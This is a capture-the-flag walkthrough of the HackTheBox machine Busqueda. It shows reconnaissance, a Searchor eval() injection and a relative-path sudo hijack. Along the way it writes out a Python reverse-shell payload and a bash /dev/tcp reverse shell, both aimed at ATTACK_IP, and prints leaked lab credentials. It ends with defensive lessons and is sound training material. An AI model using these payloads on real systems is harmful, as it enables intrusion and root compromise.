Welcome to today’s breakdown of HackTheBox’s Busqueda. This is an Easy-rated target, but it perfectly demonstrates how framework-level evaluation flaws and insecure path resolution chain into complete system compromise. Let’s move straight into the technical execution.

Initial reconnaissance begins with `nmap -p- -sV -sC <target_IP>`. We quickly identify only TCP 22 running OpenSSH 8.9p1 and TCP 80 hosting Apache 2.4.52. After DNS enumeration points to `searcher.htb`, the root application reveals itself as a Flask-based search engine. Crucially, the application footer discloses it runs Searchor version 2.4.0. Version mapping immediately flags a known critical vulnerability: Searchor 2.4.0 passes user-supplied engine definitions directly into Python’s `eval()` function without input sanitization.

For the initial foothold, I route the search submission through Burp Suite and intercept the HTTP POST request. The `engine` parameter accepts arbitrary Python code. I inject a reverse socket payload: `__import__(\'os\').system(\'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\"ATTACK_IP\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(\\"/bin/sh\\")"\')`. Forwarding the request triggers a standard HTTP 200, while my `nc -lvnp 4444` listener spawns a reverse shell as the `svc` user within `/var/www/app`.

Post-exploitation enumeration immediately pays off. Browsing the web application directory reveals a leftover `.git` folder. Grepping `.git/config` exposes a remote origin URL containing hardcoded plaintext credentials: `cody:jh1usoih2bkjaspwe92`. Pivoting to an internal Gitea instance mapped at `gitea.searcher.htb:3000` allows successful login as both `cody` and `administrator`. Meanwhile, running `sudo -l` confirms `svc` can execute `/usr/bin/python3 /opt/scripts/system-checkup.py` with `NOPASSWD` as root. The script accepts arguments like `docker-ps` and `docker-inspect`. Using the built-in inspection functionality against the gitea container and piping the output through `jq` reveals environment variables, including the database password `yuiu1hoiu4i5ho1uh`. This credential grants access to a private repository containing the actual Python source code for `system-checkup.py`.

Analyzing the source exposes the privilege escalation vector. The `full-checkup` argument invokes `subprocess.run` on `./full-checkup.sh` using a relative path. Because the script inherits the attacker’s working directory, we can hijack its execution. I navigate to a writable location, typically `/tmp`, and drop a malicious script: `echo '/bin/bash -i >& /dev/tcp/ATTACK_IP/9001 0>&1' > full-checkup.sh`. After applying execution permissions via `chmod 755 full-checkup.sh`, I run the sudo command from `/tmp`: `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`. Python resolves the relative `./full-checkup.sh` locally, executing our script with root privileges. A listener on port 9001 catches the connection, delivering a stable root shell.

Key takeaway for security professionals: This box reinforces two foundational engineering failures. First, never evaluate dynamic user input through `eval()`, `exec()`, or similar functions. Input must be strictly validated, parsed, or safely abstracted before execution. Second, and equally critical, never invoke external scripts or binaries using relative paths inside processes that run with elevated privileges. Always enforce absolute paths, explicitly validate the current working directory before spawning subprocesses, and restrict environment variable leakage from container metadata. Combine this with automated secret scanning in your repositories to catch hardcoded Git credentials before deployment. Patch your frameworks, lock down execution contexts, and assume any leaked credential is a pivot point. That’s it for Busqueda. Stay secure.
